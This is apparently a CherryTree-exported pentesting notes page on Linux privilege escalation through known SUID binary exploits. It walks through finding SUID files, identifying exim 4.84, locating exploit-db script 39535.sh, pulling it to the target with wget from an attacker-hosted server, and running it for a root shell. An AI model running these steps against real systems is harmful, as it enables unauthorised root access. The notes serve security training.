<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Known Exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Known Exploits</h1><br/><strong>Known Exploits</strong><br />Certain programs install SUID files to aid their operation.<br />Just as services which run as root can have vulnerabilities we can exploit for a root shell, so too can these SUID files.<br /><span style="text-decoration:underline;">Exploits for SUID files</span> can be found using Searchsploit, Google, and GitHub, in the same way we find exploits for Kernels and Services.<br /><br />0. <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux Smart Enumeration(lse.sh)</a><br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;./lse.sh&nbsp;-i&nbsp;|&nbsp;more</div></div><br />    <a href=""><img src="images/1306-1.png" alt="images/1306-1.png" /></a><br />1. manually locate files with the SUID or SGID bits set:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;find&nbsp;/&nbsp;-type&nbsp;f&nbsp;-a&nbsp;\(&nbsp;-perm&nbsp;-u+s&nbsp;-o&nbsp;-perm&nbsp;-g+s&nbsp;\)&nbsp;-exec&nbsp;ls&nbsp;-l&nbsp;{}&nbsp;\;&nbsp;2&gt;&nbsp;/dev/null</div></div><br />    <a href=""><img src="images/1306-2.png" alt="images/1306-2.png" /></a><br />    <a href=""><img src="images/1306-3.png" alt="images/1306-3.png" /></a><br />    We can see that <strong>exim-4.84-3</strong> file should execute with S<span style="color:#1e90ff;">U</span>ID permissions<br />2. Verify/Check version of the binary<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;&lt;binary&gt;&nbsp;--version</div></div><br />    <a href=""><img src="images/1306-4.png" alt="images/1306-4.png" /></a><br />3. search exploit with Searchsploit<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;searchsploit&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>program&amp;version<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />    <a href=""><img src="images/1306-5.png" alt="images/1306-5.png" /></a><br />4. Copy the exploit script across to the target machine. <br />   ◇ You may need to remove ^M characters from the script if we get an error like that when we try to execute it<br />    <a href=""><img src="images/1306-6.png" alt="images/1306-6.png" /></a><br />    This can happen when the the exploit code was written using Windows New Line characters<br />   ◇ Note that to get ^M on linux you have to hold Ctrl and then press V and M in succession.<br />    <div class="codebox"><div class="codebox">#copy&nbsp;the&nbsp;exploit&nbsp;in&nbsp;the&nbsp;actual&nbsp;folder<br />attacker@kali:/#&nbsp;cp&nbsp;/usr/share/exploitdb/exploits/linux/local/39535.sh&nbsp;.<br />#remove&nbsp;^M&nbsp;characters&nbsp;from&nbsp;the&nbsp;script<br />#WARNING:&nbsp;we&nbsp;cannot&nbsp;copy&nbsp;the&nbsp;following&nbsp;command&nbsp;from&nbsp;Windows&nbsp;because&nbsp;to&nbsp;make&nbsp;the&nbsp;<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^M&nbsp;character,&nbsp;we&nbsp;have&nbsp;to&nbsp;hold&nbsp;Ctrl&nbsp;and&nbsp;then&nbsp;press&nbsp;V&nbsp;and&nbsp;M&nbsp;in&nbsp;succession<br />attacker@kali:/#&nbsp;sed&nbsp;-e&nbsp;&quot;s/^M//&quot;&nbsp;39535.sh&nbsp;&gt;&nbsp;privesc.sh&nbsp;&nbsp;#WARNING!&nbsp;see&nbsp;line&nbsp;above<br />attacker@kali:/#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer</div></div><br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;wget&nbsp;http://&lt;attackerIp&gt;:8000/privesc.sh</div></div><br />5. Make sure that the script is executable<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;chmod&nbsp;+x&nbsp;privesc.sh</div></div> <br />6. Execute the script to gain a root shell<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;./privesc.sh</div></div><br />    <a href=""><img src="images/1306-7.png" alt="images/1306-7.png" /></a></div>
</body>
</html>
